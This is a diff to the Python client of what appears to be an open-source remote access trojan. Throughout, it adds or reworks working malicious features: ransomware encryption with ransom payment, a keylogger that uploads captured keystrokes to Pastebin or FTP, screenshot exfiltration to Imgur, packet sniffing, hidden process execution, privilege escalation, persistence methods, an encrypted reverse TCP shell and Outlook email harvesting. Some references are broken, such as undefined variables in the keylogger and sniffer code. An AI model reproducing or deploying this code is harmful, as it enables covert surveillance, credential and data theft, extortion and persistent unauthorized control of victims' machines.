+                self._jobs[self._ransom_payment.func_name].start()
+                return "Encrypting files..."
+        except Exception as e:
+            return "{} error: '{}'".format(self.ransom.func_name, str(e))
 
 
     @config(platforms=['win32','linux2','darwin'], command=True, usage='upload <mode> <file>')
@@ -1861,7 +2015,7 @@ class Client(object):
                 return self.upload.usage
             return getattr(self, target)(source)
         except Exception as e:
-            return "{} returned error: '{}'".format(self.upload.func_name, str(e))
+            return "{} error: '{}'".format(self.upload.func_name, str(e))
 
 
     @config(platforms=['win32','linux2','darwin'], command=True, usage='webcam <mode> [options]')
@@ -1883,7 +2037,20 @@ class Client(object):
             else:
                 return self._webcam_image(*args) if 'video' not in args else self._webcam_video(*args)
         except Exception as e:
-            return "{} returned error: '{}'".format(self.webcam.func_name, str(e))
+            return "{} error: '{}'".format(self.webcam.func_name, str(e))
+
+
+    @config(platforms=['win32','linux2','darwin'], command=True, usage='standby')
+    def standby(self):
+        """
+        disconnect from server but keep client alive
+        """
+        try:
+            self._jobs[self.standby.func_name] = threading.Timer(1.0, self._get_standby_mode)            
+            self._jobs[self.standby.func_name].start()
+            return "Standby mode enabled. Awaiting further instructions.".format(self._system.get('ip'))
+        except Exception as e:
+            return "{} error: '{}'".format(self.standby.func_name, str(e))
 
 
     @config(platforms=['win32'], command=True, usage='escalate')
@@ -1893,7 +2060,7 @@ class Client(object):
         """
         try:
             if self._get_if_admin():
-                return "Current user '{}' has administrator privileges".format(self._info.get('username'))
+                return "Current user '{}' has administrator privileges".format(self._system.get('username'))
             if hasattr(self, '__f__') and os.path.isfile(long_to_bytes(long(self.__f__))):
                 if os.name is 'nt':
                     ShellExecuteEx(lpVerb='runas', lpFile=sys.executable, lpParameters='{} asadmin'.format(long_to_bytes(long(self.__f__))))
@@ -1901,24 +2068,13 @@ class Client(object):
                 else:
                     return "Privilege escalation not yet available on '{}'".format(sys.platform)
         except Exception as e:
-            return "{} returned error: '{}'".format(self.escalate.func_name, str(e))
+            return "{} error: '{}'".format(self.escalate.func_name, str(e))
 
 
-    @config(platforms=['win32','linux2','darwin'], command=True, usage='evaluate <code>')
-    def evaluate(self, code):
-        """
-        evaluate code in current context and return output
-        """
-        try:
-            return eval(code)
-        except Exception as e:
-            return "eval('{}') failed with error: {}".format(str(code), str(e))
-
-
-    @config(platforms=['win32','linux2','darwin'], command=True, usage='execute <path>')
+    @config(platforms=['win32','linux2','darwin'], process_list={}, command=True, usage='execute <path>')
     def execute(self, path):
         """
-        execute a program in a hidden process
+        run an executable program in a hidden process
         """
         if os.path.isfile(path):
             name = os.path.splitext(os.path.basename(path))[0]
@@ -1926,23 +2082,22 @@ class Client(object):
                 info = subprocess.STARTUPINFO()
                 info.dwFlags = subprocess.STARTF_USESHOWWINDOW | subprocess.CREATE_NEW_PROCESS_GROUP
                 info.wShowWindow = subprocess.SW_HIDE
-                p = subprocess.Popen(path, startupinfo=info)
-                self._jobs[name] = self.hidden_process(p)
-                return "Launched '{}' in a hidden process".format(name)
+                self.execute.process_list[name] = subprocess.Popen(path, startupinfo=info)
+                return "Running '{}' in a hidden process".format(path)
             except Exception as e:
                 try:
-                    self._jobs[name] = subprocess.Popen(path, 0, None, None, subprocess.PIPE, subprocess.PIPE)
-                    return "Launched '{}' in as a new process".format(name)
+                    self.execute.process_list[name] = subprocess.Popen(path, 0, None, None, subprocess.PIPE, subprocess.PIPE)
+                    return "Running '{}' in a new process".format(name)
                 except Exception as e:
-                    return "{} returned error: {}".format(self.execute.func_name, str(e))
+                    return "{} error: {}".format(self.execute.func_name, str(e))
         else:
             return "File '{}' not found".format(str(path))
 
 
-    @config(platforms=['win32','linux2','darwin'], max_bytes=4000, buffer=cStringIO.StringIO(), window=None, command=True, usage='keylogger <start/stop>')
+    @config(platforms=['win32','linux2','darwin'], max_bytes=4000, buffer=cStringIO.StringIO(), window=None, command=True, usage='keylogger <start/stop/dump>')
     def keylogger(self, mode=None):
         """
-        start/stop the keylogger
+        start/stop/dump the keylogger
         """
         if not mode:
             if self.keylogger.func_name not in self._jobs:
@@ -1950,28 +2105,34 @@ class Client(object):
             else:
                 return self._get_job_status(self._jobs[self.keylogger.func_name].name)
 
-        elif mode and str(mode) == 'start':
-            if self.keylogger.func_name not in self._jobs:
-                self._jobs[self.keylogger.func_name] = threading.Thread(target=self._keylogger, name=time.time())
-                self._jobs[self.keylogger.func_name].setDaemon(True)
-                self._jobs[self.keylogger.func_name].start()
-                self._jobs[self._keylogger_manager.func_name[1:]] = threading.Thread(target=self._keylogger_manager, name=time.time())
-                self._jobs[self._keylogger_manager.func_name[1:]].setDaemon(True)
-                self._jobs[self._keylogger_manager.func_name[1:]].start()
-                return "Keylogger running"
-            else:
-                t1 = float(time.time()) - float(self._jobs[self.keylogger.func_name].name)
-                t2 = float(time.time()) - float(self._jobs[self._keylogger_manager.func_name[1:]].name)
-                return "Keylogger running: {}".format(max(t1, t2))
-        elif mode and str(mode) == 'stop':
-            if self.keylogger.func_name in self._jobs:
-                for job in self._jobs:
-                    if 'keylogger' in job:
-                         _ = self._jobs.pop(self.keylogger.func_name, None)
-                         del _
-            return "Keylogger stopped"
         else:
-            return self.keylogger.usage
+            if 'start' in mode:
+                if self.keylogger.func_name not in self._jobs:
+                    self._jobs[self.keylogger.func_name] = threading.Thread(target=self._keylogger, name=time.time())
+                    self._jobs[self.keylogger.func_name].setDaemon(True)
+                    self._jobs[self.keylogger.func_name].start()
+                    self._jobs[self._keylogger_manager.func_name] = threading.Thread(target=self._keylogger_manager, name=time.time())
+                    self._jobs[self._keylogger_manager.func_name].setDaemon(True)
+                    self._jobs[self._keylogger_manager.func_name].start()
+                    return "Keylogger running"
+                else:
+                    t1 = float(time.time()) - float(self._jobs[self.keylogger.func_name].name)
+                    t2 = float(time.time()) - float(self._jobs[self._keylogger_manager.func_name].name)
+                    return "Keylogger running: {}".format(self._get_job_status(max(t1, t2)))
+            elif 'stop' in mode:
+                try:
+                    self.stop(self.keylogger.func_name)
+                except: pass
+                try:
+                    self.stop(self._keylogger_manager.func_name)
+                except: pass
+                return "Keylogger stopped"
+            elif 'dump' in mode:
+                result = self._upload_pastebin(self.keylogger.buffer) if not 'ftp' in action else self._upload_ftp(self.keylogger.buffer)
+                self.keylogger.buffer.reset()
+                return result
+            else:
+                return self.keylogger.usage
 
 
     @config(platforms=['win32','linux2','darwin'], command=True, usage='screenshot [mode]')
@@ -1982,11 +2143,11 @@ class Client(object):
         try:
             with mss.mss() as screen:
                 img = screen.grab(screen.monitors[0])
-            png     = self._get_png(img)
+            png     = self._get_png_from_data(img)
             result  = self._upload_imgur(png) if 'ftp' not in args else self._upload_ftp(png, filetype='.png')
             return result
         except Exception as e:
-            return "{} returned error: '{}'".format(self.screenshot.func_name, str(e))
+            return "{} error: '{}'".format(self.screenshot.func_name, str(e))
 
 
     @config(platforms=['win32','linux2','darwin'], methods={method: {'established': bool(), 'result': bytes()} for method in ['encrypted_launcher','hidden_file','scheduled_task','registry_key','startup_file','launch_agent','crontab_job']}, command=True, usage='persistence <args>')
@@ -2005,14 +2166,13 @@ class Client(object):
                 return json.dumps({k: v for k,v in self.persistence.methods if sys.platform in getattr(self, k).platforms}, indent=2)
             else:
                 cmd, _, method = str(args).partition(' ')
-                method = method.replace(' ','_') if ' ' in method else method
                 if 'method' in cmd:
                     return json.dumps(self.persistence.methods)
                 elif not method or cmd not in ('add','remove') or method not in self.persistence.methods:
                     return self.persistence.usage
                 elif self.persistence.methods[method].get('established'):
                     return json.dumps(self.persistence.methods[method])
-                else:
+                else: 
                     target = '_persistence_{}_{}'.format(cmd, method)
                     if sys.platform in getattr(self, target).platforms:
                         established, result = getattr(self, target)()
@@ -2020,61 +2180,45 @@ class Client(object):
                         self.persistence.methods[method]['result'] = result
                     return json.dumps(self.persistence.methods[method])
         except Exception as e:
-            return "{} returned error: '{}'".format(self.persistence.func_name, str(e))
+            return "{} error: '{}'".format(self.persistence.func_name, str(e))
 
-        
 
-    @config(platforms=['linux2','darwin'], command=True, usage='packetsniffer [mode]')
-    def packetsniffer(self, *args):
+    @config(platforms=['linux2','darwin'], capture=[], command=True, usage='packetsniffer [mode]')
+    def packetsniffer(self, args):
         """
         sniff local network and capture packets
         """
-        def sniffer(self, seconds, *args):
-            limit = time.time() + seconds
-            sniffer_socket = socket.socket(socket.PF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
-            while time.time() < limit:
-                try:
-                    recv_data = sniffer_socket.recv(2048)
-                    recv_data, ip_bool = self._packetsniffer_eth_header(recv_data)
-                    if ip_bool:
-                        recv_data, ip_proto = self._packetsniffer_ip_header(recv_data)
-                        if ip_proto == 6:
-                            recv_data = self._packetsniffer_tcp_header(recv_data)
-                        elif ip_proto == 17:
-                            recv_data = self._packetsniffer_udp_header(recv_data)
-                except: break
-            sniffer_socket.close()
-            try:
-                output = cStringIO.StringIO('\n'.join(self.packetsniffer.capture))
-                result = self._upload_pastebin(output) if 'ftp' not in args else self._upload_ftp(output, filetype='.pcap')
-            except Exception as e:
-                self.debug("packetsniffer manager returned error: {}".format(str(e)))
         try:
-            duration = 300.0 if not len([i for i in args if str(i).isdigit()]) else int([i for i in args if str(i).isdigit()][0])
-            if self.packetsniffer.func_name in self._jobs:
-                return "packetsniffer running for {}".format(self._get_job_status(self._jobs[self.packetsniffer.func_name].name))
-            if not str(duration).isdigit():
-                return "packetsniffer argument 'duration' must be integer"
-            duration = int(duration)
-            self._jobs[self.packetsniffer.func_name] = threading.Thread(target=sniffer, args=(self, duration), name=time.time())
-            self._jobs[self.packetsniffer.func_name].start()
-            return 'Capturing network traffic for {} seconds'.format(duration)
+            cmd, _, action = str(args).partition(' ')
+            if 'start' in cmd:
+                mode   = None
+                length = None
+                for arg in action.split():
+                    if arg.isdigit():
+                        length = int(arg)
+                    elif arg in ('ftp','pastebin'):
+                        mode   = arg
+                self._jobs[self.packetsniffer.func_name] = threading.Thread(target=self._get_packets, kwargs={'seconds': length, 'mode': mode}, name=time.time())
+                self._jobs[self.packetsniffer.func_name].start()
+                return 'Capturing network traffic for {} seconds'.format(duration)
         except Exception as e:
-            return "{} returned error: '{}'".format(self.packetsniffer.func_name, str(e))
+            return "{} error: '{}'".format(self.packetsniffer.func_name, str(e))
 
 
-    def connect(self, **kwargs):
+    @config(platforms=['win32'], buffer=cStringIO.StringIO(), max_bytes=1024, command=True, usage='process <mode>')
+    def process(self, args=None):
         """
-        create secure connection with server and start new session 
+        list/monitor/search/kill currently running processes
         """
         try:
-            self.kill()
-            self._session['socket']      = self._get_new_connection()
-            self._session['key']         = self._get_session_key()
-            self._session['id']          = self._get_session_id()
-            self._session['public_key']  = self._get_public_key()
+            if not args:
+                return self.process.usage
+            else:
+                cmd, _, action = str(args).partition(' ')
+                if hasattr(self, '_process_%s' % cmd):
+                    return getattr(self, '_process_%s' % cmd)(action)
         except Exception as e:
-            return "{} returned error: '{}'".format(self.connect.func_name, str(e))
+            return "{} error: '{}'".format(self.process.func_name, str(e))
 
 
     def reverse_tcp_shell(self):
@@ -2082,11 +2226,11 @@ class Client(object):
         send encrypted shell back to server via outgoing TCP connection
         """
         try:
-            self._send(**{'id': '0' * 64, 'client_id': self._info['id'], 'session_id': self._session['id'], 'task': 'prompt', 'data': '[{} @ %s]> ' % os.getcwd()})
+            self._server_send(**{'id': '0' * 64, 'client_id': self._system['id'], 'session_id': self._session['id'], 'task': 'prompt', 'data': '[{} @ %s]> ' % os.getcwd()})
             while True:
                 if self._session['connection'].wait(timeout=3.0):
                     if not self._session['prompt'].is_set():
-                        task   = self._recv()
+                        task   = self._server_recv()
                         if task:
                             result = ""
                             command, _, action  = bytes(task['task']).partition(' ')
@@ -2104,7 +2248,7 @@ class Client(object):
                             if result and result != "None":
                                 task.update({"data": result})
                                 self._results[time.ctime()] = task
-                                self._send(**task)
+                                self._server_send(**task)
                             self._session['prompt'].set()
                 else:        
                     self.debug("{} stopped".format(self.reverse_tcp_shell.func_name))
@@ -2112,36 +2256,57 @@ class Client(object):
             self.kill()
             return self.run()
         except Exception as e:
-            return "{} returned error: '{}'".format(self.reverse_tcp_shell.func_name, str(e))
+            return "{} error: '{}'".format(self.reverse_tcp_shell.func_name, str(e))
 
+
+    def connect(self, **kwargs):
+        """
+        connect to server and start new session
+        """
+        try:
+            self.kill()
+            self._session['socket']      = self._server_connect()
+            self._session['key']         = self._get_session_key()
+            self._session['id']          = self._get_session_id()
+            self._session['public_key']  = self._get_public_key()
+        except Exception as e:
+            return "{} error: '{}'".format(self.connect.func_name, str(e))
 
     @staticmethod
     def debug(data):
         """
-        prints client output to console if debugging is enabled
+        print output to console if debugging mode is enabled
         """
         if Client._debug:
             with Client._lock:
-                print(bytes(data))
+                try:
+                    print(bytes(data))
+                except Exception as e:
+                    print("{} error: {}".format(Client.debug.func_name, str(e)))
 
 
     def run(self, *args, **kwargs):
         """
-        start a secure reverse tcp shell between client and server
+        initiate client startup routine
         """
         try:
             self.connect(*args, **kwargs)
-            self._jobs['reverse_tcp_shell'] = threading.Thread(target=self.reverse_tcp_shell, name=time.time())
-            self._jobs['reverse_tcp_shell'].start()
-            self._jobs['shell_prompt'] = threading.Thread(target=self._get_shell_prompt, name=time.time())
-            self._jobs['shell_prompt'].daemon = True
-            self._jobs['shell_prompt'].start()
-            self._jobs['task_manager'] = threading.Thread(target=self._task_manager, name=time.time())
-            self._jobs['task_manager'].daemon = True
-            self._jobs['task_manager'].start()
+            if self._session['connection'].wait(timeout=3.0):
+                self._jobs[self.reverse_tcp_shell.func_name] = threading.Thread(target=self.reverse_tcp_shell, name=time.time())
+                self._jobs[self.reverse_tcp_shell.func_name].start()
+                self._jobs[self._server_prompt.func_name] = threading.Thread(target=self._server_prompt, name=time.time())
+                self._jobs[self._server_prompt.func_name].daemon = True
+                self._jobs[self._server_prompt.func_name].start()
+                self._jobs[self._task_manager.func_name] = threading.Thread(target=self._task_manager, name=time.time())
+                self._jobs[self._task_manager.func_name].daemon = True
+                self._jobs[self._task_manager.func_name].start()
+            else:
+                self.debug("Connection failed - restarting in 5 seconds...")
+                self.kill()
+                time.sleep(5)
+                return self.run()
         except Exception as e:
-            return "{} returned error: '{}'".format(self.run.func_name, str(e))
-
+            return "{} error: {}".format(self.run.func_name, str(e))
 
 
 
@@ -2149,37 +2314,83 @@ def main(*args, **kwargs):
     try:
         if '--debug' in sys.argv:
             Client._debug = True
-            Client.debug("\nDebugging mode enabled\n")
+            Client.debug("Debugging: enabled")
         if 'f' not in kwargs and '__file__' in globals():
             kwargs['f'] = bytes_to_long(globals()['__file__'])            
         if 'w' in kwargs:
             exec "import urllib" in globals()
             w = kwargs.get('w')
-            imports = Client._get_config(w)
+            imports = Client._get_user_config(w)
             exec imports in globals()           
         if 'v' in kwargs:
             v = kwargs.get('v')
-            Client._save = Client._get_config(v).splitlines()
+            Client._save = Client._get_user_config(v).splitlines()
         if 'd' in kwargs:
             d = kwargs.get('d')
-            imgur_api_key= Client._get_config(d)
+            imgur_api_key= Client._get_user_config(d)
             Client._get_new_option('_upload_imgur', api_key=imgur_api_key)
         if 'c' in kwargs:
             c = kwargs.get('c')
-            pastebin_api_key, pastebin_user_key = Client._get_config(c).splitlines()
+            pastebin_api_key, pastebin_user_key = Client._get_user_config(c).splitlines()
             Client._get_new_option('_upload_pastebin', api_dev_key=pastebin_api_key, api_User_key=pastebin_user_key)            
         if 'q' in kwargs:
             q = kwargs.get('q')
-            ftp_host, ftp_user, ftp_passwd  = Client._get_config(q).splitlines()
+            ftp_host, ftp_user, ftp_passwd  = Client._get_user_config(q).splitlines()
             Client._get_new_option('_upload_ftp', hostname=ftp_host, username=ftp_user, password=ftp_passwd)
         if 'p' in kwargs:
             p = kwargs.get('p')
-            ransom_account_id, ransom_api_key, ransom_api_secret, ransom_api_version = Client._get_config(p).splitlines()
+            ransom_account_id, ransom_api_key, ransom_api_secret, ransom_api_version = Client._get_user_config(p).splitlines()
             Client._get_new_option('_ransom_payment', account_id=ransom_account_id, api_key=ransom_api_key, api_secret=ransom_api_secret, api_version=ransom_api_version)
     finally:
         payload = Client(**kwargs)
-        #payload.run() if not Client._debug else payload.run(host='127.0.0.1', port=1337)
+        #payload.run()
         return payload
+
+
+
+class Outlook():
+    options = {
+        "help"              : "show this usage help menu",
+        "installed"         : "check if Outlook is installed on host device",
+        "read [integer]"    : "read emails [default: 1]",
+        "search <string>"   : "search the user's emails for words/phrases [separator: ',']"
+    }
+                
+    def __init__(self, *args, **kwargs):
+        if not Outlook.installed(): return
+        self.cache  = []
+        self.mapi   = win32com.client.Dispatch('Outlook.Application').GetNameSpace('MAPI')
+        self.inbox  = self.mapi.GetDefaultFolder(6)
+        self.emails = self.inbox.Items
+
+    @staticmethod
+    def installed(*args, **kwargs):
+        try:
+            if win32com.client.Dispatch('Outlook.Application').GetNameSpace('MAPI'):
+                return True
+        except: pass
+        return False
+
+    @staticmethod
+    def help(*args, **kwargs):
+        return json.dumps(Outlook.options, indent=2)
+    
+    def dump(self, n=1):
+        for i, email in enumerate(self.emails):
+            if i == n:
+                break
+            sender   = email.SenderEmailAddress.encode('ascii','ignore')
+            message  = email.Body.encode('ascii','ignore')[:150] + '...'
+            subject  = email.Subject.encode('ascii','ignore')
+            received = str(email.ReceivedTime).replace('/','-').replace('\\','').replace(':','-').replace(' ','_')
+            result   = {'date': received, 'from': sender, 'subject': subject, 'message': message}
+            self.cache.append(result)
+        return self.cache
+
+    def read(self, *args, **kwargs):
+        for data in self.cache:
+            max_len  = "{:<%d}" % int(max([len(i) for i in data.keys()]) + 2)
+            Client.debug(json.dumps({max_len.format(k): v for k,v in data.items()}, indent=2))
 
 
 if __name__ == '__main__':
